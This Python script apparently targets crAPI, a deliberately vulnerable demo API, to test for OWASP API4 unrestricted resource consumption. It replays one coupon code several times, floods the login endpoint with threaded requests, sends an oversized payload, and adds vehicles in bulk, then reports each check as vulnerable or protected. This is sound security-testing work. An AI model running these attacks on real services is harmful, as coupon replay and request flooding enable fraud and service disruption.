#!/usr/bin/env python3
"""
OWASP API Security Top 10:2023 - API4: Unrestricted Resource Consumption
Target: crAPI running on Docker (default port 8888)

Tests for:
  - No rate limiting on resource-heavy endpoints
  - Unlimited coupon redemption attempts
  - Large payload acceptance
  - Unrestricted file upload size
  - Rapid-fire API calls without throttling
"""

import requests
import time
import threading
import json
import sys
import os

from crapi_config import BASE_URL, USER1_EMAIL, USER1_PASSWORD, USER2_EMAIL, USER2_PASSWORD
USER_EMAIL = USER1_EMAIL
USER_PASSWORD = USER1_PASSWORD




def get_token():
    r = requests.post(f"{BASE_URL}/identity/api/auth/login",
                      json={"email": USER_EMAIL, "password": USER_PASSWORD})
    if r.status_code == 200:
        return r.json().get("token")
    return None


def test_coupon_replay_no_limit(token):
    """
    API4 Test: crAPI allows redeeming the same coupon code multiple times.
    No rate limiting or one-time-use enforcement.
    """
    print(f"\n[API4:ResourceConsumption] Coupon Code Replay Attack")
    headers = {"Authorization": f"Bearer {token}"}
    coupon_code = "TRAC075"  # Default crAPI demo coupon

    successes = 0
    for i in range(1, 6):
        r = requests.post(f"{BASE_URL}/community/api/v2/coupon/validate-coupon",
                          headers=headers, json={"coupon_code": coupon_code})
        print(f"  Attempt {i}: HTTP {r.status_code} → {r.text[:100]}")
        if r.status_code == 200:
            successes += 1
        time.sleep(0.2)

    if successes >= 2:
        print(f"  [VULNERABLE] Coupon redeemed {successes}/5 times without restriction!")
        return True
    else:
        print(f"  [PROTECTED or INVALID] Coupon only succeeded {successes}/5 times")
        return False


def test_rate_limit_login(target_rps=20, duration_sec=3):
    """
    API4 Test: Hammer the login endpoint and measure if any throttling occurs.
    """
    print(f"\n[API4:ResourceConsumption] Login Endpoint Rate Limit Stress Test")
    print(f"  Target: {target_rps} req/s for {duration_sec}s")

    results = {"200": 0, "429": 0, "500": 0, "other": 0}
    lock = threading.Lock()

    def fire():
        r = requests.post(f"{BASE_URL}/identity/api/auth/login",
                          json={"email": "bogus@test.com", "password": "wrong"})
        with lock:
            key = str(r.status_code) if str(r.status_code) in results else "other"
            results[key] += 1

    start = time.time()
    threads = []
    delay = 1.0 / target_rps
    while time.time() - start < duration_sec:
        t = threading.Thread(target=fire)
        t.start()
        threads.append(t)
        time.sleep(delay)

    for t in threads:
        t.join()

    total = sum(results.values())
    print(f"  Total requests: {total}")
    print(f"  Response breakdown: {results}")

    if results["429"] == 0 and results["other"] < total * 0.1:
        print(f"  [VULNERABLE] No rate limiting detected — {total} requests, 0 rate-limit responses")
        return True
    else:
        print(f"  [PROTECTED] Rate limiting detected ({results['429']} 429 responses)")
        return False


def test_large_payload(token):
    """
    API4 Test: Send an oversized payload to a POST endpoint.
    No size limit = resource exhaustion risk.
    """
    print(f"\n[API4:ResourceConsumption] Large Payload Injection")
    headers = {"Authorization": f"Bearer {token}"}

    # 512KB string payload
    large_string = "A" * 512 * 1024
    payload = {"title": large_string, "body": large_string}

    start = time.time()
    try:
        r = requests.post(f"{BASE_URL}/community/api/v2/community/posts",
                          headers=headers, json=payload, timeout=10)
        elapsed = time.time() - start
        print(f"  Sent ~1MB payload → HTTP {r.status_code} in {elapsed:.2f}s")
        if r.status_code in (200, 201):
            print(f"  [VULNERABLE] Server accepted 1MB payload with no size restriction!")
            return True
        elif r.status_code == 413:
            print(f"  [PROTECTED] Server returned 413 Payload Too Large")
        else:
            print(f"  [INFO] Response: {r.text[:200]}")
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        print(f"  [VULNERABLE] Server hung for {elapsed:.1f}s processing large payload (DoS risk)")
        return True
    except Exception as e:
        print(f"  [ERROR] {e}")
    return False


def test_vehicle_add_unlimited(token):
    """
    API4 Test: Is there a limit on how many vehicles a user can add?
    """
    print(f"\n[API4:ResourceConsumption] Unlimited Vehicle Addition")
    headers = {"Authorization": f"Bearer {token}"}

    added = 0
    for i in range(5):
        # Generate pseudo-unique VIN
        vin = f"TESTVIN{i:013d}"
        payload = {
            "vin": vin,
            "pincode": f"{1000 + i}"
        }
        r = requests.post(f"{BASE_URL}/identity/api/v2/vehicle/add_vehicle",
                          headers=headers, json=payload)
        print(f"  Add vehicle {i+1} (VIN={vin}) → HTTP {r.status_code}: {r.text[:80]}")
        if r.status_code in (200, 201):
            added += 1
        time.sleep(0.2)

    if added >= 3:
        print(f"  [VULNERABLE] Added {added}/5 vehicles with no per-user limit!")
        return True
    else:
        print(f"  [INFO] Only {added}/5 vehicles added (may be limited or VIN validation enforced)")
        return False


def main():
    print("=" * 60)
    print("  crAPI - API4: Unrestricted Resource Consumption")
    print("=" * 60)
    print(f"\nTarget: {BASE_URL}")

    token = get_token()
    if not token:
        print("[ERROR] Authentication failed. Check USER_EMAIL/USER_PASSWORD.")
        sys.exit(1)
    print(f"[AUTH] Token acquired: {token[:40]}...")

    results = []
    results.append(("Coupon Code Replay (No Rate Limit)",   test_coupon_replay_no_limit(token)))
    results.append(("Login Endpoint Stress Test",            test_rate_limit_login()))
    results.append(("Large Payload Acceptance (1MB)",        test_large_payload(token)))
    results.append(("Unlimited Vehicle Addition",            test_vehicle_add_unlimited(token)))

    print("\n" + "=" * 60)
    print("  RESULTS SUMMARY")
    print("=" * 60)
    for name, vuln in results:
        status = "VULNERABLE ⚠️ " if vuln else "PROTECTED  ✅"
        print(f"  {status}  {name}")
    print()


if __name__ == "__main__":
    main()
